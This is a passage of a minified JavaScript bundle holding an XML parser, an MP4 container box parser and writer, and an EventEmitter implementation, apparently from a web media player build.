comment"),-1):-1;if("CDATA["==e.substr(t+3,6)){var i=e.indexOf("]]>",t+9);return r.startCDATA(),r.characters(e,t+9,i-t-9),r.endCDATA(),i+3}var n=function(e,t){var r,s=[],i=/'[^']+'|"[^"]+"|[^\s<>\/=]+=?|(\/?\s*>|<)/g;i.lastIndex=t,i.exec(e);for(;r=i.exec(e);)if(s.push(r),r[1])return s}(e,t),o=n.length;if(o>1&&/!doctype/i.test(n[0][0])){var a=n[1][0],h=!1,c=!1;o>3&&(/^public$/i.test(n[2][0])?(h=n[3][0],c=o>4&&n[4][0]):/^system$/i.test(n[2][0])&&(c=n[3][0]));var l=n[o-1];return r.startDTD(a,h,c),r.endDTD(),l.index+l[0].length}return-1}function g(e,t,r){var s=e.indexOf("?>",t);if(s){var i=e.substring(t,s).match(/^<\?(\S*)\s*([\s\S]*?)\s*$/);if(i){i[0].length;return r.processingInstruction(i[1],i[2]),s+2}return-1}return-1}function m(){this.attributeNames={}}a.prototype=new Error,a.prototype.name=a.name,h.prototype={parse:function(e,t,r){var i=this.domBuilder;i.startDocument(),_(t,t={}),function(e,t,r,i,n){function o(e){if(e>65535){var t=55296+((e-=65536)>>10),r=56320+(1023&e);return String.fromCharCode(t,r)}return String.fromCharCode(e)}function h(e){var t=e.slice(1,-1);return t in r?r[t]:"#"===t.charAt(0)?o(parseInt(t.substr(1).replace("x","0x"))):(n.error("entity not found:"+e),e)}function _(t){if(t>w){var r=e.substring(w,t).replace(/&#?\w+;/g,h);v&&E(w),i.characters(r,0,t-w),w=t}}function E(t,r){for(;t>=b&&(r=S.exec(e));)y=r.index,b=y+r[0].length,v.lineNumber++;v.columnNumber=t-y+1}var y=0,b=0,S=/.*(?:\r\n?|\n)|.*$/g,v=i.locator,T=[{currentNSMap:t}],P={},w=0;for(;;){try{var R=e.indexOf("<",w);if(R<0){if(!e.substr(w).match(/^\s*$/)){var A=i.doc,I=A.createTextNode(e.substr(w));A.appendChild(I),i.currentElement=I}return}switch(R>w&&_(R),e.charAt(R+1)){case"/":var C=e.indexOf(">",R+3),D=e.substring(R+2,C).replace(/[ \t\n\r]+$/g,""),N=T.pop();C<0?(D=e.substring(R+2).replace(/[\s<].*/,""),n.error("end tag name: "+D+" is not complete:"+N.tagName),C=R+1+D.length):D.match(/\s</)&&(D=D.replace(/[\s<].*/,""),n.error("end tag name: "+D+" maybe not complete"),C=R+1+D.length);var L=N.localNSMap,O=N.tagName==D;if(O||N.tagName&&N.tagName.toLowerCase()==D.toLowerCase()){if(i.endElement(N.uri,N.localName,D),L)for(var M in L)i.endPrefixMapping(M);O||n.fatalError("end tag name: "+D+" is not match the current start tagName:"+N.tagName)}else T.push(N);C++;break;case"?":v&&E(R),C=g(e,R,i);break;case"!":v&&E(R),C=p(e,R,i,n);break;default:v&&E(R);var x=new m,F=T[T.length-1].currentNSMap,B=(C=l(e,R,x,F,h,n),x.length);if(!x.closed&&f(e,C,x.tagName,P)&&(x.closed=!0,r.nbsp||n.warning("unclosed xml attribute")),v&&B){for(var U=c(v,{}),k=0;k<B;k++){var q=x[k];E(q.offset),q.locator=c(v,{})}i.locator=U,u(x,i,F)&&T.push(x),i.locator=v}else u(x,i,F)&&T.push(x);s.isHTML(x.uri)&&!x.closed?C=d(e,C,x.tagName,h,i):C++}}catch(e){if(e instanceof a)throw e;n.error("element parse error: "+e),C=-1}C>w?w=C:_(Math.max(R,w)+1)}}(e,t,r,i,this.errorHandler),i.endDocument()}},m.prototype={setTagName:function(e){if(!o.test(e))throw new Error("invalid tagName:"+e);this.tagName=e},addValue:function(e,t,r){if(!o.test(e))throw new Error("invalid attribute:"+e);this.attributeNames[e]=this.length,this[this.length++]={qName:e,value:t,offset:r}},length:0,getLocalName:function(e){return this[e].localName},getLocator:function(e){return this[e].locator},getQName:function(e){return this[e].qName},getURI:function(e){return this[e].uri},getValue:function(e){return this[e].value}},t.XMLReader=h,t.ParseError=a},100:(e,t)=>{var r={parseBuffer:function(e){return new s(e).parse()},addBoxProcessor:function(e,t){"string"==typeof e&&"function"==typeof t&&(i.prototype._boxProcessors[e]=t)},createFile:function(){return new s},createBox:function(e,t,r){var s=i.create(e);return t&&t.append(s,r),s},createFullBox:function(e,t,s){var i=r.createBox(e,t,s);return i.version=0,i.flags=0,i},Utils:{}};r.Utils.dataViewToString=function(e,t){var r=t||"utf-8";if("undefined"!=typeof TextDecoder)return new TextDecoder(r).decode(e);var s=[],i=0;if("utf-8"===r)for(;i<e.byteLength;){var n=e.getUint8(i++);n<128||(n<224?(n=(31&n)<<6,n|=63&e.getUint8(i++)):n<240?(n=(15&n)<<12,n|=(63&e.getUint8(i++))<<6,n|=63&e.getUint8(i++)):(n=(7&n)<<18,n|=(63&e.getUint8(i++))<<12,n|=(63&e.getUint8(i++))<<6,n|=63&e.getUint8(i++))),s.push(String.fromCharCode(n))}else for(;i<e.byteLength;)s.push(String.fromCharCode(e.getUint8(i++)));return s.join("")},r.Utils.utf8ToByteArray=function(e){var t,r;if("undefined"!=typeof TextEncoder)t=(new TextEncoder).encode(e);else for(t=[],r=0;r<e.length;++r){var s=e.charCodeAt(r);s<128?t.push(s):s<2048?(t.push(192|s>>6),t.push(128|63&s)):s<65536?(t.push(224|s>>12),t.push(128|63&s>>6),t.push(128|63&s)):(t.push(240|s>>18),t.push(128|63&s>>12),t.push(128|63&s>>6),t.push(128|63&s))}return t},r.Utils.appendBox=function(e,t,r){if(t._offset=e._cursor.offset,t._root=e._root?e._root:e,t._raw=e._raw,t._parent=e,-1!==r)if(null!=r){var s,i=-1;if("number"==typeof r)i=r;else{if("string"==typeof r)s=r;else{if("object"!=typeof r||!r.type)return void e.boxes.push(t);s=r.type}for(var n=0;n<e.boxes.length;n++)if(s===e.boxes[n].type){i=n+1;break}}e.boxes.splice(i,0,t)}else e.boxes.push(t)},t.parseBuffer=r.parseBuffer,t.addBoxProcessor=r.addBoxProcessor,t.createFile=r.createFile,t.createBox=r.createBox,t.createFullBox=r.createFullBox,t.Utils=r.Utils,r.Cursor=function(e){this.offset=void 0===e?0:e};var s=function(e){this._cursor=new r.Cursor,this.boxes=[],e&&(this._raw=new DataView(e))};s.prototype.fetch=function(e){var t=this.fetchAll(e,!0);return t.length?t[0]:null},s.prototype.fetchAll=function(e,t){var r=[];return s._sweep.call(this,e,r,t),r},s.prototype.parse=function(){for(this._cursor.offset=0,this.boxes=[];this._cursor.offset<this._raw.byteLength;){var e=i.parse(this);if(void 0===e.type)break;this.boxes.push(e)}return this},s._sweep=function(e,t,r){for(var i in this.type&&this.type==e&&t.push(this),this.boxes){if(t.length&&r)return;s._sweep.call(this.boxes[i],e,t,r)}},s.prototype.write=function(){var e,t=0;for(e=0;e<this.boxes.length;e++)t+=this.boxes[e].getLength(!1);var r=new Uint8Array(t);for(this._rawo=new DataView(r.buffer),this.bytes=r,this._cursor.offset=0,e=0;e<this.boxes.length;e++)this.boxes[e].write();return r.buffer},s.prototype.append=function(e,t){r.Utils.appendBox(this,e,t)};var i=function(){this._cursor=new r.Cursor};i.parse=function(e){var t=new i;return t._offset=e._cursor.offset,t._root=e._root?e._root:e,t._raw=e._raw,t._parent=e,t._parseBox(),e._cursor.offset=t._raw.byteOffset+t._raw.byteLength,t},i.create=function(e){var t=new i;return t.type=e,t.boxes=[],t},i.prototype._boxContainers=["dinf","edts","mdia","meco","mfra","minf","moof","moov","mvex","stbl","strk","traf","trak","tref","udta","vttc","sinf","schi","encv","enca"],i.prototype._boxProcessors={},i.prototype._procField=function(e,t,r){this._parsing?this[e]=this._readField(t,r):this._writeField(t,r,this[e])},i.prototype._procFieldArray=function(e,t,r,s){var i;if(this._parsing)for(this[e]=[],i=0;i<t;i++)this[e][i]=this._readField(r,s);else for(i=0;i<this[e].length;i++)this._writeField(r,s,this[e][i])},i.prototype._procFullBox=function(){this._procField("version","uint",8),this._procField("flags","uint",24)},i.prototype._procEntries=function(e,t,r){var s;if(this._parsing)for(this[e]=[],s=0;s<t;s++)this[e].push({}),r.call(this,this[e][s]);else for(s=0;s<t;s++)r.call(this,this[e][s])},i.prototype._procSubEntries=function(e,t,r,s){var i;if(this._parsing)for(e[t]=[],i=0;i<r;i++)e[t].push({}),s.call(this,e[t][i]);else for(i=0;i<r;i++)s.call(this,e[t][i])},i.prototype._procEntryField=function(e,t,r,s){this._parsing?e[t]=this._readField(r,s):this._writeField(r,s,e[t])},i.prototype._procSubBoxes=function(e,t){var r;if(this._parsing)for(this[e]=[],r=0;r<t;r++)this[e].push(i.parse(this));else for(r=0;r<t;r++)this._rawo?this[e][r].write():this.size+=this[e][r].getLength()},i.prototype._readField=function(e,t){switch(e){case"uint":return this._readUint(t);case"int":return this._readInt(t);case"template":return this._readTemplate(t);case"string":return-1===t?this._readTerminatedString():this._readString(t);case"data":return this._readData(t);case"utf8":return this._readUTF8String();default:return-1}},i.prototype._readInt=function(e){var t=null,r=this._cursor.offset-this._raw.byteOffset;switch(e){case 8:t=this._raw.getInt8(r);break;case 16:t=this._raw.getInt16(r);break;case 32:t=this._raw.getInt32(r);break;case 64:var s=this._raw.getInt32(r),i=this._raw.getInt32(r+4);t=s*Math.pow(2,32)+i}return this._cursor.offset+=e>>3,t},i.prototype._readUint=function(e){var t,r,s=null,i=this._cursor.offset-this._raw.byteOffset;switch(e){case 8:s=this._raw.getUint8(i);break;case 16:s=this._raw.getUint16(i);break;case 24:s=((t=this._raw.getUint16(i))<<8)+(r=this._raw.getUint8(i+2));break;case 32:s=this._raw.getUint32(i);break;case 64:t=this._raw.getUint32(i),r=this._raw.getUint32(i+4),s=t*Math.pow(2,32)+r}return this._cursor.offset+=e>>3,s},i.prototype._readString=function(e){for(var t="",r=0;r<e;r++){var s=this._readUint(8);t+=String.fromCharCode(s)}return t},i.prototype._readTemplate=function(e){return this._readUint(e/2)+this._readUint(e/2)/Math.pow(2,e/2)},i.prototype._readTerminatedString=function(){for(var e="";this._cursor.offset-this._offset<this._raw.byteLength;){var t=this._readUint(8);if(0===t)break;e+=String.fromCharCode(t)}return e},i.prototype._readData=function(e){var t=e>0?e:this._raw.byteLength-(this._cursor.offset-this._offset);if(t>0){var r=new Uint8Array(this._raw.buffer,this._cursor.offset,t);return this._cursor.offset+=t,r}return null},i.prototype._readUTF8String=function(){var e=this._raw.byteLength-(this._cursor.offset-this._offset),t=null;return e>0&&(t=new DataView(this._raw.buffer,this._cursor.offset,e),this._cursor.offset+=e),t?r.Utils.dataViewToString(t):t},i.prototype._parseBox=function(){if(this._parsing=!0,this._cursor.offset=this._offset,this._offset+8>this._raw.buffer.byteLength)this._root._incomplete=!0;else{switch(this._procField("size","uint",32),this._procField("type","string",4),1===this.size&&this._procField("largesize","uint",64),"uuid"===this.type&&this._procFieldArray("usertype",16,"uint",8),this.size){case 0:this._raw=new DataView(this._raw.buffer,this._offset,this._raw.byteLength-this._cursor.offset+8);break;case 1:this._offset+this.size>this._raw.buffer.byteLength?(this._incomplete=!0,this._root._incomplete=!0):this._raw=new DataView(this._raw.buffer,this._offset,this.largesize);break;default:this._offset+this.size>this._raw.buffer.byteLength?(this._incomplete=!0,this._root._incomplete=!0):this._raw=new DataView(this._raw.buffer,this._offset,this.size)}this._incomplete||(this._boxProcessors[this.type]&&this._boxProcessors[this.type].call(this),-1!==this._boxContainers.indexOf(this.type)?this._parseContainerBox():this._data=this._readData())}},i.prototype._parseFullBox=function(){this.version=this._readUint(8),this.flags=this._readUint(24)},i.prototype._parseContainerBox=function(){for(this.boxes=[];this._cursor.offset-this._raw.byteOffset<this._raw.byteLength;)this.boxes.push(i.parse(this))},i.prototype.append=function(e,t){r.Utils.appendBox(this,e,t)},i.prototype.getLength=function(){if(this._parsing=!1,this._rawo=null,this.size=0,this._procField("size","uint",32),this._procField("type","string",4),1===this.size&&this._procField("largesize","uint",64),"uuid"===this.type&&this._procFieldArray("usertype",16,"uint",8),this._boxProcessors[this.type]&&this._boxProcessors[this.type].call(this),-1!==this._boxContainers.indexOf(this.type))for(var e=0;e<this.boxes.length;e++)this.size+=this.boxes[e].getLength();return this._data&&this._writeData(this._data),this.size},i.prototype.write=function(){switch(this._parsing=!1,this._cursor.offset=this._parent._cursor.offset,this.size){case 0:this._rawo=new DataView(this._parent._rawo.buffer,this._cursor.offset,this.parent._rawo.byteLength-this._cursor.offset);break;case 1:this._rawo=new DataView(this._parent._rawo.buffer,this._cursor.offset,this.largesize);break;default:this._rawo=new DataView(this._parent._rawo.buffer,this._cursor.offset,this.size)}if(this._procField("size","uint",32),this._procField("type","string",4),1===this.size&&this._procField("largesize","uint",64),"uuid"===this.type&&this._procFieldArray("usertype",16,"uint",8),this._boxProcessors[this.type]&&this._boxProcessors[this.type].call(this),-1!==this._boxContainers.indexOf(this.type))for(var e=0;e<this.boxes.length;e++)this.boxes[e].write();return this._data&&this._writeData(this._data),this._parent._cursor.offset+=this.size,this.size},i.prototype._writeInt=function(e,t){if(this._rawo){var r=this._cursor.offset-this._rawo.byteOffset;switch(e){case 8:this._rawo.setInt8(r,t);break;case 16:this._rawo.setInt16(r,t);break;case 32:this._rawo.setInt32(r,t);break;case 64:var s=Math.floor(t/Math.pow(2,32)),i=t-s*Math.pow(2,32);this._rawo.setUint32(r,s),this._rawo.setUint32(r+4,i)}this._cursor.offset+=e>>3}else this.size+=e>>3},i.prototype._writeUint=function(e,t){if(this._rawo){var r,s,i=this._cursor.offset-this._rawo.byteOffset;switch(e){case 8:this._rawo.setUint8(i,t);break;case 16:this._rawo.setUint16(i,t);break;case 24:r=(16776960&t)>>8,s=255&t,this._rawo.setUint16(i,r),this._rawo.setUint8(i+2,s);break;case 32:this._rawo.setUint32(i,t);break;case 64:s=t-(r=Math.floor(t/Math.pow(2,32)))*Math.pow(2,32),this._rawo.setUint32(i,r),this._rawo.setUint32(i+4,s)}this._cursor.offset+=e>>3}else this.size+=e>>3},i.prototype._writeString=function(e,t){for(var r=0;r<e;r++)this._writeUint(8,t.charCodeAt(r))},i.prototype._writeTerminatedString=function(e){if(0!==e.length){for(var t=0;t<e.length;t++)this._writeUint(8,e.charCodeAt(t));this._writeUint(8,0)}},i.prototype._writeTemplate=function(e,t){var r=Math.floor(t),s=(t-r)*Math.pow(2,e/2);this._writeUint(e/2,r),this._writeUint(e/2,s)},i.prototype._writeData=function(e){if(e)if(this._rawo){if(e instanceof Array){for(var t=this._cursor.offset-this._rawo.byteOffset,r=0;r<e.length;r++)this._rawo.setInt8(t+r,e[r]);this._cursor.offset+=e.length}e instanceof Uint8Array&&(this._root.bytes.set(e,this._cursor.offset),this._cursor.offset+=e.length)}else this.size+=e.length},i.prototype._writeUTF8String=function(e){var t=r.Utils.utf8ToByteArray(e);if(this._rawo)for(var s=new DataView(this._rawo.buffer,this._cursor.offset,t.length),i=0;i<t.length;i++)s.setUint8(i,t[i]);else this.size+=t.length},i.prototype._writeField=function(e,t,r){switch(e){case"uint":this._writeUint(t,r);break;case"int":this._writeInt(t,r);break;case"template":this._writeTemplate(t,r);break;case"string":-1==t?this._writeTerminatedString(r):this._writeString(t,r);break;case"data":this._writeData(r);break;case"utf8":this._writeUTF8String(r)}},i.prototype._boxProcessors.avc1=i.prototype._boxProcessors.encv=function(){this._procFieldArray("reserved1",6,"uint",8),this._procField("data_reference_index","uint",16),this._procField("pre_defined1","uint",16),this._procField("reserved2","uint",16),this._procFieldArray("pre_defined2",3,"uint",32),this._procField("width","uint",16),this._procField("height","uint",16),this._procField("horizresolution","template",32),this._procField("vertresolution","template",32),this._procField("reserved3","uint",32),this._procField("frame_count","uint",16),this._procFieldArray("compressorname",32,"uint",8),this._procField("depth","uint",16),this._procField("pre_defined3","int",16),this._procField("config","data",-1)},i.prototype._boxProcessors.dref=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procSubBoxes("entries",this.entry_count)},i.prototype._boxProcessors.elst=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procEntries("entries",this.entry_count,(function(e){this._procEntryField(e,"segment_duration","uint",1===this.version?64:32),this._procEntryField(e,"media_time","int",1===this.version?64:32),this._procEntryField(e,"media_rate_integer","int",16),this._procEntryField(e,"media_rate_fraction","int",16)}))},i.prototype._boxProcessors.emsg=function(){this._procFullBox(),1==this.version?(this._procField("timescale","uint",32),this._procField("presentation_time","uint",64),this._procField("event_duration","uint",32),this._procField("id","uint",32),this._procField("scheme_id_uri","string",-1),this._procField("value","string",-1)):(this._procField("scheme_id_uri","string",-1),this._procField("value","string",-1),this._procField("timescale","uint",32),this._procField("presentation_time_delta","uint",32),this._procField("event_duration","uint",32),this._procField("id","uint",32)),this._procField("message_data","data",-1)},i.prototype._boxProcessors.free=i.prototype._boxProcessors.skip=function(){this._procField("data","data",-1)},i.prototype._boxProcessors.frma=function(){this._procField("data_format","uint",32)},i.prototype._boxProcessors.ftyp=i.prototype._boxProcessors.styp=function(){this._procField("major_brand","string",4),this._procField("minor_version","uint",32);var e=-1;this._parsing&&(e=(this._raw.byteLength-(this._cursor.offset-this._raw.byteOffset))/4),this._procFieldArray("compatible_brands",e,"string",4)},i.prototype._boxProcessors.hdlr=function(){this._procFullBox(),this._procField("pre_defined","uint",32),this._procField("handler_type","string",4),this._procFieldArray("reserved",3,"uint",32),this._procField("name","string",-1)},i.prototype._boxProcessors.mdat=function(){this._procField("data","data",-1)},i.prototype._boxProcessors.mdhd=function(){this._procFullBox(),this._procField("creation_time","uint",1==this.version?64:32),this._procField("modification_time","uint",1==this.version?64:32),this._procField("timescale","uint",32),this._procField("duration","uint",1==this.version?64:32),this._parsing||"string"!=typeof this.language||(this.language=this.language.charCodeAt(0)-96<<10|this.language.charCodeAt(1)-96<<5|this.language.charCodeAt(2)-96),this._procField("language","uint",16),this._parsing&&(this.language=String.fromCharCode(96+(this.language>>10&31),96+(this.language>>5&31),96+(31&this.language))),this._procField("pre_defined","uint",16)},i.prototype._boxProcessors.mehd=function(){this._procFullBox(),this._procField("fragment_duration","uint",1==this.version?64:32)},i.prototype._boxProcessors.mfhd=function(){this._procFullBox(),this._procField("sequence_number","uint",32)},i.prototype._boxProcessors.mfro=function(){this._procFullBox(),this._procField("mfra_size","uint",32)},i.prototype._boxProcessors.mp4a=i.prototype._boxProcessors.enca=function(){this._procFieldArray("reserved1",6,"uint",8),this._procField("data_reference_index","uint",16),this._procFieldArray("reserved2",2,"uint",32),this._procField("channelcount","uint",16),this._procField("samplesize","uint",16),this._procField("pre_defined","uint",16),this._procField("reserved3","uint",16),this._procField("samplerate","template",32),this._procField("esds","data",-1)},i.prototype._boxProcessors.mvhd=function(){this._procFullBox(),this._procField("creation_time","uint",1==this.version?64:32),this._procField("modification_time","uint",1==this.version?64:32),this._procField("timescale","uint",32),this._procField("duration","uint",1==this.version?64:32),this._procField("rate","template",32),this._procField("volume","template",16),this._procField("reserved1","uint",16),this._procFieldArray("reserved2",2,"uint",32),this._procFieldArray("matrix",9,"template",32),this._procFieldArray("pre_defined",6,"uint",32),this._procField("next_track_ID","uint",32)},i.prototype._boxProcessors.payl=function(){this._procField("cue_text","utf8")},i.prototype._boxProcessors.pssh=function(){this._procFullBox(),this._procFieldArray("SystemID",16,"uint",8),this._procField("DataSize","uint",32),this._procFieldArray("Data",this.DataSize,"uint",8)},i.prototype._boxProcessors.schm=function(){this._procFullBox(),this._procField("scheme_type","uint",32),this._procField("scheme_version","uint",32),1&this.flags&&this._procField("scheme_uri","string",-1)},i.prototype._boxProcessors.sdtp=function(){this._procFullBox();var e=-1;this._parsing&&(e=this._raw.byteLength-(this._cursor.offset-this._raw.byteOffset)),this._procFieldArray("sample_dependency_table",e,"uint",8)},i.prototype._boxProcessors.sidx=function(){this._procFullBox(),this._procField("reference_ID","uint",32),this._procField("timescale","uint",32),this._procField("earliest_presentation_time","uint",1==this.version?64:32),this._procField("first_offset","uint",1==this.version?64:32),this._procField("reserved","uint",16),this._procField("reference_count","uint",16),this._procEntries("references",this.reference_count,(function(e){this._parsing||(e.reference=(1&e.reference_type)<<31,e.reference|=2147483647&e.referenced_size,e.sap=(1&e.starts_with_SAP)<<31,e.sap|=(3&e.SAP_type)<<28,e.sap|=268435455&e.SAP_delta_time),this._procEntryField(e,"reference","uint",32),this._procEntryField(e,"subsegment_duration","uint",32),this._procEntryField(e,"sap","uint",32),this._parsing&&(e.reference_type=e.reference>>31&1,e.referenced_size=2147483647&e.reference,e.starts_with_SAP=e.sap>>31&1,e.SAP_type=e.sap>>28&7,e.SAP_delta_time=268435455&e.sap)}))},i.prototype._boxProcessors.smhd=function(){this._procFullBox(),this._procField("balance","uint",16),this._procField("reserved","uint",16)},i.prototype._boxProcessors.ssix=function(){this._procFullBox(),this._procField("subsegment_count","uint",32),this._procEntries("subsegments",this.subsegment_count,(function(e){this._procEntryField(e,"ranges_count","uint",32),this._procSubEntries(e,"ranges",e.ranges_count,(function(e){this._procEntryField(e,"level","uint",8),this._procEntryField(e,"range_size","uint",24)}))}))},i.prototype._boxProcessors.stsd=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procSubBoxes("entries",this.entry_count)},i.prototype._boxProcessors.subs=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procEntries("entries",this.entry_count,(function(e){this._procEntryField(e,"sample_delta","uint",32),this._procEntryField(e,"subsample_count","uint",16),this._procSubEntries(e,"subsamples",e.subsample_count,(function(e){this._procEntryField(e,"subsample_size","uint",1===this.version?32:16),this._procEntryField(e,"subsample_priority","uint",8),this._procEntryField(e,"discardable","uint",8),this._procEntryField(e,"codec_specific_parameters","uint",32)}))}))},i.prototype._boxProcessors.tenc=function(){this._procFullBox(),this._procField("default_IsEncrypted","uint",24),this._procField("default_IV_size","uint",8),this._procFieldArray("default_KID",16,"uint",8)},i.prototype._boxProcessors.tfdt=function(){this._procFullBox(),this._procField("baseMediaDecodeTime","uint",1==this.version?64:32)},i.prototype._boxProcessors.tfhd=function(){this._procFullBox(),this._procField("track_ID","uint",32),1&this.flags&&this._procField("base_data_offset","uint",64),2&this.flags&&this._procField("sample_description_offset","uint",32),8&this.flags&&this._procField("default_sample_duration","uint",32),16&this.flags&&this._procField("default_sample_size","uint",32),32&this.flags&&this._procField("default_sample_flags","uint",32)},i.prototype._boxProcessors.tfra=function(){this._procFullBox(),this._procField("track_ID","uint",32),this._parsing||(this.reserved=0,this.reserved|=(48&this.length_size_of_traf_num)<<4,this.reserved|=(12&this.length_size_of_trun_num)<<2,this.reserved|=3&this.length_size_of_sample_num),this._procField("reserved","uint",32),this._parsing&&(this.length_size_of_traf_num=(48&this.reserved)>>4,this.length_size_of_trun_num=(12&this.reserved)>>2,this.length_size_of_sample_num=3&this.reserved),this._procField("number_of_entry","uint",32),this._procEntries("entries",this.number_of_entry,(function(e){this._procEntryField(e,"time","uint",1===this.version?64:32),this._procEntryField(e,"moof_offset","uint",1===this.version?64:32),this._procEntryField(e,"traf_number","uint",8*(this.length_size_of_traf_num+1)),this._procEntryField(e,"trun_number","uint",8*(this.length_size_of_trun_num+1)),this._procEntryField(e,"sample_number","uint",8*(this.length_size_of_sample_num+1))}))},i.prototype._boxProcessors.tkhd=function(){this._procFullBox(),this._procField("creation_time","uint",1==this.version?64:32),this._procField("modification_time","uint",1==this.version?64:32),this._procField("track_ID","uint",32),this._procField("reserved1","uint",32),this._procField("duration","uint",1==this.version?64:32),this._procFieldArray("reserved2",2,"uint",32),this._procField("layer","uint",16),this._procField("alternate_group","uint",16),this._procField("volume","template",16),this._procField("reserved3","uint",16),this._procFieldArray("matrix",9,"template",32),this._procField("width","template",32),this._procField("height","template",32)},i.prototype._boxProcessors.trex=function(){this._procFullBox(),this._procField("track_ID","uint",32),this._procField("default_sample_description_index","uint",32),this._procField("default_sample_duration","uint",32),this._procField("default_sample_size","uint",32),this._procField("default_sample_flags","uint",32)},i.prototype._boxProcessors.trun=function(){this._procFullBox(),this._procField("sample_count","uint",32),1&this.flags&&this._procField("data_offset","int",32),4&this.flags&&this._procField("first_sample_flags","uint",32),this._procEntries("samples",this.sample_count,(function(e){256&this.flags&&this._procEntryField(e,"sample_duration","uint",32),512&this.flags&&this._procEntryField(e,"sample_size","uint",32),1024&this.flags&&this._procEntryField(e,"sample_flags","uint",32),2048&this.flags&&this._procEntryField(e,"sample_composition_time_offset",1===this.version?"int":"uint",32)}))},i.prototype._boxProcessors["url "]=i.prototype._boxProcessors["urn "]=function(){this._procFullBox(),"urn "===this.type&&this._procField("name","string",-1),this._procField("location","string",-1)},i.prototype._boxProcessors.vlab=function(){this._procField("source_label","utf8")},i.prototype._boxProcessors.vmhd=function(){this._procFullBox(),this._procField("graphicsmode","uint",16),this._procFieldArray("opcolor",3,"uint",16)},i.prototype._boxProcessors.vttC=function(){this._procField("config","utf8")},i.prototype._boxProcessors.vtte=function(){}},204:e=>{"use strict";var t,r="object"==typeof Reflect?Reflect:null,s=r&&"function"==typeof r.apply?r.apply:function(e,t,r){return Function.prototype.apply.call(e,t,r)};t=r&&"function"==typeof r.ownKeys?r.ownKeys:Object.getOwnPropertySymbols?function(e){return Object.getOwnPropertyNames(e).concat(Object.getOwnPropertySymbols(e))}:function(e){return Object.getOwnPropertyNames(e)};var i=Number.isNaN||function(e){return e!=e};function n(){n.init.call(this)}e.exports=n,e.exports.once=function(e,t){return new Promise((function(r,s){function i(r){e.removeListener(t,n),s(r)}function n(){"function"==typeof e.removeListener&&e.removeListener("error",i),r([].slice.call(arguments))}p(e,t,n,{once:!0}),"error"!==t&&function(e,t,r){"function"==typeof e.on&&p(e,"error",t,r)}(e,i,{once:!0})}))},n.EventEmitter=n,n.prototype._events=void 0,n.prototype._eventsCount=0,n.prototype._maxListeners=void 0;var o=10;function a(e){if("function"!=typeof e)throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof e)}function h(e){return void 0===e._maxListeners?n.defaultMaxListeners:e._maxListeners}function c(e,t,r,s){var i,n,o,c;if(a(r),void 0===(n=e._events)?(n=e._events=Object.create(null),e._eventsCount=0):(void 0!==n.newListener&&(e.emit("newListener",t,r.listener?r.listener:r),n=e._events),o=n[t]),void 0===o)o=n[t]=r,++e._eventsCount;else if("function"==typeof o?o=n[t]=s?[r,o]:[o,r]:s?o.unshift(r):o.push(r),(i=h(e))>0&&o.length>i&&!o.warned){o.warned=!0;var l=new Error("Possible EventEmitter memory leak detected. "+o.length+" "+String(t)+" listeners added. Use emitter.setMaxListeners() to increase limit");l.name="MaxListenersExceededWarning",l.emitter=e,l.type=t,l.count=o.length,c=l,console&&console.warn&&console.warn(c)}return e}function l(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,0===arguments.length?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function u(e,t,r){var s={fired:!1,wrapFn:void 0,target:e,type:t,listener:r},i=l.bind(s);return i.listener=r,s.wrapFn=i,i}function d(e,t,r){var s=e._events;if(void 0===s)return[];var i=s[t];return void 0===i?[]:"function"==typeof i?r?[i.listener||i]:[i]:r?function(e){for(var t=new Array(e.length),r=0;r<t.length;++r)t[r]=e[r].listener||e[r];return t}(i):_(i,i.length)}function f(e){var t=this._events;if(void 0!==t){var r=t[e];if("function"==typeof r)return 1;if(void 0!==r)return r.length}return 0}function _(e,t){for(var r=new Array(t),s=0;s<t;++s)r[s]=e[s];return r}function p(e,t,r,s){if("function"==typeof e.on)s.once?e.once(t,r):e.on(t,r);else{if("function"!=typeof e.addEventListener)throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof e);e.addEventListener(t,(function i(n){s.once&&e.removeEventListener(t,i),r(n)}))}}Object.defineProperty(n,"defaultMaxListeners",{enumerable:!0,get:function(){return o},set:function(e){if("number"!=typeof e||e<0||i(e))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+e+".");o=e}}),n.init=function(){void 0!==this._events&&this._events!==Object.getPrototypeOf(this)._events||(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},n.prototype.setMaxListeners=function(e){if("number"!=typeof e||e<0||i(e))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+e+".");return this._maxListeners=e,this},n.prototype.getMaxListeners=function(){return h(this)},n.prototype.emit=function(e){for(var t=[],r=1;r<arguments.length;r++)t.push(arguments[r]);var i="error"===e,n=this._events;if(void 0!==n)i=i&&void 0===n.error;else if(!i)return!1;if(i){var o;if(t.length>0&&(o=t[0]),o instanceof Error)throw o;var a=new Error("Unhandled error."+(o?" ("+o.message+")":""));throw a.context=o,a}var h=n[e];if(void 0===h)return!1;if("function"==typeof h)s(h,this,t);else{var c=h.length,l=_(h,c);for(r=0;r<c;++r)s(l[r],this,t)}return!0},n.prototype.addListener=function(e,t){return c(this,e,t,!1)},n.prototype.on=n.prototype.addListener,n.prototype.prependListener=function(e,t){return c(this,e,t,!0)},n.prototype.once=function(e,t){return a(t),this.on(e,u(this,e,t)),this},n.prototype.prependOnceListener=function(e,t){return a(t),this.prependListener(e,u(this,e,t)),this},n.prototype.removeListener=function(e,t){var r,s,i,n,o;if(a(t),void 0===(s=this._events))return this;if(void 0===(r=s[e]))return this;if(r===t||r.listener===t)0==--this._eventsCount?this._events=Object.create(null):(delete s[e],s.removeListener&&this.emit("removeListener",e,r.listener||t));else if("function"!=typeof r){for(i=-1,n=r.length-1;n>=0;n--)if(r[n]===t||r[n].listener===t){o=r[n].listener,i=n;break}if(i<0)return this;0===i?r.shift():function(e,t){for(;t+1<e.length;t++)e[t]=e[t+1];e.pop()}(r,i),1===r.length&&(s[e]=r[0]),void 0!==s.removeListener&&this.emit("removeListener",e,o||t)}return this},n.prototype.off=n.prototype.removeListener,n.prototype.removeAllListeners=function(e){var t,r,s;if(void 0===(r=this._events))return this;if(void 0===r.removeListener)return 